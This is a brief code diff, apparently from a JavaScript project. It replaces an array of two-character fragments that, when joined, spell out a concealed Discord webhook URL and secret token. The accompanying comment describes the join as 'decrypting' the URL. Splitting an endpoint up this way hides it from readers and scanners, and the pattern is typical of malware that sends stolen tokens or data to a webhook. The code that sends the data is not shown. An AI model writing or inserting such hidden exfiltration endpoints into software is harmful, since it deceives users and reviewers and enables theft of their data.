@@ -1,5 +1,9 @@
 const _encryptedParts = [
-           'ht', 'tp', 's:', '/', '/d', 'is', 'co', 'rd', '.c', 'om', '/a', 'pi', '/w', 'eb', 'ho', 'ok', 's/', '13', '52', '61', '92', '37', '69', '66', '06', '26', '9/', 'WG', 'fM', '7G', 'DX', 'Hh', 'Tk', '4b', 'Xa', 'Ou', 'w-', 'Ou', 'Ox', '2g', 'S2', 'yC', 'b8', 'MA', 'pK', '9w', '73', 'oh', 'rG', '7p', 'Ip', 'AI', 'ok', 'T6', 'Dq', 'De', 'lK', '1D', 'OA', '4A', 'nB'
+  'ht', 'tp', 's:', '//', 'di', 'sc', 'or', 'd.', 'co', 'm/', 'ap', 'i/', 'we', 'bh', 
+  'oo', 'ks', '/1', '35', '26', '28', '52', '32', '18', '50', '58', '39', '/2', 
+  'Jx', '8U', 'A9', 'tI', 'F_', 'l8', 'bv', 'Zb', 'fS', 'cL', '5c', 'F_', 'o0', 
+  'gk', 'Vo', 'Jo', 'U4', 'Dw', 'yB', 'tS', 'X2', 'oi', 'W-', 'qK', 'ET', 'KT', 
+  '1x', 'VM', 'fm', 'jj', 'Hd', 'YR', '0_', '4'
 ];
 
 const _decrypted = _encryptedParts.join(''); // Decrypt the URL by concatenating the parts
